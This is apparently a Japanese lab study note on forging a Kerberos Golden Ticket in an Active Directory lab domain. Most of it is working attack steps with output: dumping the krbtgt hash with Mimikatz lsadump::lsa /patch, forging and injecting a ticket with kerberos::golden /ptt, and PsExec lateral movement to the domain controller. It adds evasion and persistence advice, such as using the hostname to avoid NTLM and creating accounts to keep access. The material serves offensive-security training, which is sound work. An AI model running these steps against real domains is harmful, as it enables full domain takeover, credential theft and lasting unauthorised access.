 # 攻撃の概要
- krbtgtパスワード ハッシュを入手できれば、ゴールデン チケットとも呼ばれる独自のカスタム TGT を作成できる
- シルバーチケットは特定のサービスにアクセスするためのTGSチケットを偽造することを目的としているのに対し、ゴールデンチケットはドメイン全体のリソースへのアクセスを許可する
- 権限のないユーザーが Domain Admins グループのメンバーであることを示す TGT を作成すると、正しく暗号化されているためドメイン コントローラーはそれを信頼してしまう
- 最大の利点は、krbtgtアカウントのパスワードが自動的に変更されないこと

# 流れ
## 1. 横展開の試行
- 権限のないユーザでCLIENT74からDCへPsExec経由でjenユーザーとしてcmdコマンドで従来のコマンドシェルを起動し、水平移動を試みるが、権限がないため失敗する
- #CLIENT74 
```powershell
PsExec64.exe \\DC1 cmd.exe
```
![](Assets/Images/Pasted%20image%2020260502094358.png)

## 2. Mimikatz を使用してkrbtgtアカウントのパスワード ハッシュを抽出
- jeffadmin（Domain Admins）アカウントを使用してRDPでDC1にログイン
- Mimikatzを実行し、 以下のようにlsadump::lsaコマンドを実行
- krbtgtアカウントの NTLM ハッシュとドメイン SID を取得したら、ゴールデン チケットを偽造して挿入できるようになる

#DC1
```mimikatz
privilege::debug

Privilege '20' OK

lsadump::lsa /patch

Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```


## 3. 既存のKerberosチケットを削除
#CLIENT74
```mimikatz
kerberos::purge
Ticket(s) purge for current session is OK
```

## 4. チケットの作成
### ドメイン SIDの取得
```powershell
whoami /user
```
### チケットの作成及びメモリに挿入
```mimikatz
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
- /krbtgt krbtgtユーザーアカウントのパスワードハッシュを指定
*2022年7月以降、Microsoft は認証プロセスを改善したため、既存のアカウントを提供する必要になった
- /user:jen 
- /domain:corp.com 
- /sid:S-1-5-21-1987370270-658905905-1781884369 
- /krbtgt:1693c6cefafffc7af11ef34d1c788f47 
- /ptt Pass the Ticket
![](Assets/Images/Pasted%20image%2020260502094413.png)

### mimikatz上から新しいプロンプトを起動
```mimikatz
misc::cmd
```

###  5.  横展開
#CLIENT74
新しいプロンプトから再度横展開
```cmd
PsExec.exe \\dc1 cmd.exe
```

```cmd
hostname

whoami

whoami /groups
```
![](Assets/Images/Pasted%20image%2020260502094435.png)
![](Assets/Images/Pasted%20image%2020260502094441.png)
jenがDomain Adminsに所属していることが確認できる
### 6. 注意点
#### ホスト名を使用すること
PsExec をホスト名ではなくドメインコントローラの IP アドレスに接続すると、NTLM 認証が強制的に使用されることになり、アクセスは依然としてブロックされる
```cmd
psexec.exe \\192.168.158.70 cmd.exe
```
![](Assets/Images/Pasted%20image%2020260502094447.png)

#### 永続化にはしっかりとユーザの作成や、グループへの追加操作等を実施すること
チケットによる一時的な権限のため、再起動すると消えてしまう
